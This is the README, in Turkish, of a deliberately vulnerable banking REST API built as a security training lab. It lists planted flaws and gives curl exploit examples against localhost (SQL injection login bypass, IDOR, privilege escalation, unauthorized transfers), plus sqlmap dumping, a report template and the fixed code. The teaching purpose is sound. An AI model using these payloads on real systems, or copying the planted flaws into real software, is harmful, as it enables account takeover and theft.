# 🏦 Vulnerable Bank API - Security Research Project

![Security Research](https://img.shields.io/badge/Security-Research-red)
![Python](https://img.shields.io/badge/Python-3.9+-blue)
![Flask](https://img.shields.io/badge/Flask-3.0-green)
![License](https://img.shields.io/badge/License-Educational-yellow)

> **⚠️ UYARI:** Bu proje **sadece eğitim amaçlıdır**. Kasıtlı olarak güvenlik açıkları içerir. Gerçek ortamlarda ASLA kullanmayın!

## 📋 Proje Hakkında

Bu proje, API güvenlik zafiyetlerini anlamak ve test etmek için geliştirilmiş **kasıtlı olarak vulnerable** bir RESTful API'dir. OWASP API Security Top 10'dan 34 farklı zafiyet içerir.

### 🎯 Amaç

- API penetrasyon testi yeteneklerini geliştirmek
- SDLC (Software Development Lifecycle) güvenlik prensiplerini öğrenmek
- Güvenli kod yazma pratikleri yapmak
- Profesyonel pentest raporu hazırlama deneyimi kazanmak

### 🏆 Proje Özellikleri

- ✅ 34 gerçekçi güvenlik zafiyeti
- ✅ OWASP API Security Top 10 coverage
- ✅ Otomatik exploit test suite
- ✅ Detaylı exploitation guide
- ✅ Burp Suite entegrasyonu
- ✅ Profesyonel pentest rapor şablonu

---

## 🚀 Kurulum

### Gereksinimler

- Python 3.9+
- pip
- virtualenv (önerilir)

### Adım 1: Projeyi Clone'layın

```bash
git clone https://github.com/yourusername/vulnerable-bank-api.git
cd vulnerable-bank-api
```

### Adım 2: Virtual Environment Oluşturun

```bash
python -m venv venv

# Linux/Mac
source venv/bin/activate

# Windows
venv\Scripts\activate
```

### Adım 3: Bağımlılıkları Yükleyin

```bash
pip install -r requirements.txt
```

### Adım 4: Uygulamayı Başlatın

```bash
python app.py
```

API `http://localhost:5000` adresinde çalışacak.

### Adım 5: Test Verilerini Kontrol Edin

Uygulama ilk çalıştırıldığında otomatik olarak test kullanıcıları oluşturur:

| Username | Password | Role | Account Balance |
|----------|----------|------|----------------|
| admin | admin123 | admin | $100,000 |
| alice | password123 | user | $5,000 + $10,000 |
| bob | pass456 | user | $3,000 |

---

## 🎯 Zafiyet Listesi (34 Adet)

### Critical Severity (9.0+)

| ID | Zafiyet | CVSS | Kategori |
|----|---------|------|----------|
| VULN-010 | SQL Injection (Login) | 9.8 | Injection |
| VULN-016 | SQL Injection (User Endpoint) | 9.8 | Injection |
| VULN-021 | BOLA - Unauthorized Transfer | 8.8 | Broken Access Control |
| VULN-033 | Remote Code Execution | 9.9 | Injection |
| VULN-018 | Mass Assignment (Privilege Escalation) | 9.1 | Broken Access Control |

### High Severity (7.0-8.9)

| ID | Zafiyet | CVSS | Kategori |
|----|---------|------|----------|
| VULN-001 | Hardcoded Weak Secret | 7.5 | Cryptographic Failure |
| VULN-005 | JWT Algorithm Confusion | 8.1 | Authentication |
| VULN-017 | IDOR - User Update | 8.1 | Broken Access Control |
| VULN-020 | IDOR - Account Access | 7.7 | Broken Access Control |
| VULN-026 | SQL Injection (Search) | 8.6 | Injection |
| VULN-027 | Debug Config Exposure | 7.5 | Security Misconfiguration |
| VULN-029 | Unrestricted File Upload | 8.6 | Injection |

### Medium Severity

- Excessive Data Exposure (SSN, Passwords)
- Weak Password Policy
- No Rate Limiting
- Information Disclosure
- +15 other vulnerabilities

---

## 🔍 Exploit Örnekleri

### 1. SQL Injection - Authentication Bypass

```bash
# Login endpoint'inde SQLi
curl -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"anything"}'

# Başarılı response:
{
  "message": "Login successful",
  "token": "eyJ0eXAiOiJKV1QiLCJhbGc..."
}
```

### 2. IDOR - Unauthorized Account Access

```bash
# Alice olarak login
TOKEN=$(curl -s -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | jq -r '.token')

# Bob'un hesap bakiyesini gör
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5000/api/account/4

# Response:
{
  "id": 4,
  "balance": 3000.0,
  "account_number": "ACC00000004"
}
```

### 3. Mass Assignment - Privilege Escalation

```bash
# Alice kendini admin yapar
curl -X PUT http://localhost:5000/api/user/2 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'

# Artık admin endpoints'e erişebilir
curl -H "Authorization: Bearer $NEW_TOKEN" \
  http://localhost:5000/api/admin/users
```

### 4. BOLA - Steal Money from Any Account

```bash
# Alice, Bob'un hesabından kendi hesabına para transfer eder
curl -X POST http://localhost:5000/api/transfer \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "from_account_id": 4,
    "to_account_id": 2,
    "amount": 1000,
    "description": "Unauthorized transfer"
  }'
```

**Daha fazla exploit için:** `EXPLOITATION_GUIDE.md` dosyasına bakın.

---

## 🛠️ Test Araçları

### 1. Otomatik Test Suite

```bash
# Tüm zafiyetleri otomatik test et
pip install colorama
python test_exploits.py
```

**Çıktı Örneği:**
```
[✓] EXPLOITABLE - SQL Injection - Authentication Bypass
    Details: Payload 'admin' OR '1'='1' bypassed authentication
[✓] EXPLOITABLE - IDOR - View Other Users' Accounts
    Details: Alice can view Bob's account balance
[✓] EXPLOITABLE - Mass Assignment - Privilege Escalation to Admin
    Details: Alice escalated privileges to admin via mass assignment

Overall Risk Score: 9.2/10 (CRITICAL)
```

### 2. Burp Suite ile Test

#### Setup:
1. Burp Suite'i başlatın
2. Proxy ayarlarını yapın: `localhost:8080`
3. Browser'ı Burp proxy'sine yönlendirin
4. Intercept açın ve trafiği yakalayın

#### Test Senaryoları:

**SQL Injection Detection:**
- Target: `POST /api/login`
- Payload: `admin'` (syntax error bekle)
- Tool: Burp Repeater

**IDOR Fuzzing:**
- Target: `GET /api/account/§1§`
- Payload: Numbers 1-100
- Tool: Burp Intruder

**JWT Manipulation:**
- Extension: JSON Web Token Attacker
- Decode JWT → Change role → Re-sign

### 3. Manual Testing with cURL

```bash
# API endpoints'leri keşfet
curl http://localhost:5000/api/ -v

# SQLMap ile automated SQLi test
sqlmap -u "http://localhost:5000/api/user/1" \
  --cookie="token=YOUR_TOKEN" \
  --dump --batch

# jwt_tool ile JWT analiz
python3 jwt_tool.py YOUR_TOKEN -T
```

---

## 📊 Pentest Raporu Hazırlama

### Rapor Yapısı

```
1. Executive Summary
   - Test özeti
   - Risk skoru
   - Kritik bulgular

2. Methodology
   - Test kapsamı
   - Kullanılan araçlar
   - Test süresi

3. Findings (Her zafiyet için)
   - Vulnerability ID
   - CVSS Score
   - Description
   - Proof of Concept (PoC)
   - Impact Analysis
   - Remediation Steps
   - Screenshots

4. Recommendations
   - Öncelikli fix'ler
   - Genel güvenlik tavsiyeleri

5. Appendix
   - Full scan results
   - Code snippets
   - Tool versions
```

### Örnek Finding:

```markdown
## VULN-021: Broken Object Level Authorization

**CVSS Score:** 8.8 (High)
**Category:** Broken Access Control

**Description:**
The `/api/transfer` endpoint does not verify if the 
`from_account_id` belongs to the authenticated user. Any user 
can transfer money from any account they know the ID of.

**Proof of Concept:**
```bash
# Alice (user_id=2) transfers from Bob's account (account_id=4)
curl -X POST http://localhost:5000/api/transfer \
  -H "Authorization: Bearer alice_token" \
  -d '{"from_account_id":4,"to_account_id":2,"amount":1000}'
```

**Screenshot:** [Burp Suite request/response]

**Impact:**
- Financial loss for account owners
- Unauthorized fund transfers
- Complete compromise of all accounts

**Remediation:**
```python
# FIX: Check ownership
from_account = Account.query.get(from_account_id)
if from_account.user_id != current_user.id:
    return jsonify({'error': 'Unauthorized'}), 403
```

**References:**
- OWASP API Security Top 10 - API1:2023 Broken Object Level Authorization
- CWE-639: Authorization Bypass Through User-Controlled Key
```

---

## 🔒 Secure Version (Düzeltilmiş Kod)

Aynı API'nin güvenli versiyonunu görmek için:

```bash
git checkout secure-version
```

### Ana Düzeltmeler:

1. **SQL Injection → Parameterized Queries**
```python
# BEFORE (Vulnerable)
query = f"SELECT * FROM users WHERE id = {user_id}"

# AFTER (Secure)
query = "SELECT * FROM users WHERE id = ?"
cursor.execute(query, (user_id,))
```

2. **IDOR → Authorization Checks**
```python
# BEFORE
account = Account.query.get(account_id)

# AFTER
account = Account.query.get(account_id)
if account.user_id != current_user.id:
    return jsonify({'error': 'Unauthorized'}), 403
```

3. **Mass Assignment → Whitelist Fields**
```python
# BEFORE
user.role = data.get('role')  # Dangerous!

# AFTER
ALLOWED_FIELDS = ['email', 'phone', 'full_name']
for field in ALLOWED_FIELDS:
    if field in data:
        setattr(user, field, data[field])
```

---

## 📚 Öğrenme Kaynakları

### Kurslar & Sertifikalar
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) (Ücretsiz)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [HackTheBox](https://hackthebox.com) - API challenge'ları
- [TryHackMe](https://tryhackme.com) - API hacking rooms

### Araçlar
- Burp Suite Professional/Community
- OWASP ZAP
- Postman
- SQLMap
- jwt_tool

### Kitaplar
- "Web Application Security" - Andrew Hoffman
- "The Web Application Hacker's Handbook" - Dafydd Stuttard

---

## 🎬 Demo Video

[YouTube Demo Link] - API'nin exploit edilmesi (yakında)

---

## 📝 Lisans

Bu proje **sadece eğitim amaçlıdır**. MIT Lisansı altında dağıtılmaktadır.

**UYARI:** Bu kodu gerçek sistemlerde kullanmak yasadışıdır ve etik dışıdır. Yalnızca kontrollü test ortamlarında kullanın.

---

## 🤝 Katkıda Bulunma

Yeni zafiyet senaryoları veya exploit teknikleri eklemek isterseniz:

1. Fork yapın
2. Feature branch oluşturun (`git checkout -b feature/new-vulnerability`)
3. Commit'leyin (`git commit -m 'Add new XSS vulnerability'`)
4. Push edin (`git push origin feature/new-vulnerability`)
5. Pull Request açın

---

## 👨‍💻 Yazar

**[Your Name]**
- LinkedIn: [your-profile]
- GitHub: [@yourusername]
- Portfolio: [your-website]

---

## 🙏 Teşekkürler

Bu proje OWASP API Security Project'e ve güvenlik topluluğuna saygı duruşu olarak hazırlanmıştır.

**Disclaimer:** Bu araç sadece yasal ve etik penetrasyon testleri için tasarlanmıştır. İzinsiz sistemlere saldırı yasal değildir.

---

## 📞 İletişim

Sorularınız için:
- Email: your.email@example.com
- Twitter: @yourhandle
- Discord: YourServer#1234

---

**⭐ Bu projeyi beğendiyseniz star vermeyi unutmayın!**
